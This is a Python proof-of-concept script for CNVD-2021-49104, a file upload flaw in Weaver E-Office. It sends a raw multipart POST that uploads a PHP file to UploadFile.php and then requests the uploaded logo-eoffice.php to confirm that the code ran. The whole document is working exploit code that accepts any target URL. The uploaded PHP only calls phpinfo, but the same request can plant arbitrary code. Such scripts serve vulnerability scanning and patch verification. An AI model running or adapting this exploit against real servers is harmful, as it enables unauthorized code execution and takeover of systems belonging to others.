import requests
from urllib.parse import urlparse
import socket
import urllib,re

def CNVD_2021_49104(url):
    relsult = {
        'name': 'CNVD-2021-49104——泛微E-Office文件上传漏洞',
        'vulnerable': False
    }
    payload = b'''
POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
Host: 127.0.0.1:7899
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348
Content-Length: 193
Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4

--e64bdf16c554bbc109cecef6451c26a4
Content-Disposition: form-data; name="Filedata"; filename="test.php"
Content-Type: image/jpeg

<?php phpinfo(test);?>

--e64bdf16c554bbc109cecef6451c26a4--
'''.replace(b'\n', b'\r\n')
    try:
        oH = urlparse(url)
        a = oH.netloc.split(':')
        port = 80
        if 2 == len(a):
            port = a[1]
        elif 'https' in oH.scheme:
            port = 443
        host = a[0]
        with socket.create_connection((host, port), timeout=5) as conn:
            conn.send(payload)
            req1 = conn.recv(10240).decode()
            verify_url = urllib.parse.urljoin(url, '/images/logo/logo-eoffice.php')
            req2 = requests.get(verify_url, timeout=3)
            if re.search('PHP Version',req2.text) and req2.status_code == 200:
                relsult['vulnerable'] = True
                relsult['method'] = 'POST'
                relsult['url'] = url
                relsult['verify'] = verify_url
                relsult['about'] = 'https://blog.csdn.net/weixin_44309905/article/details/121588557'
                return relsult
        return relsult
    except:
        return relsult


if __name__ == '__main__':
    url = input('url:')
    print(CNVD_2021_49104(url))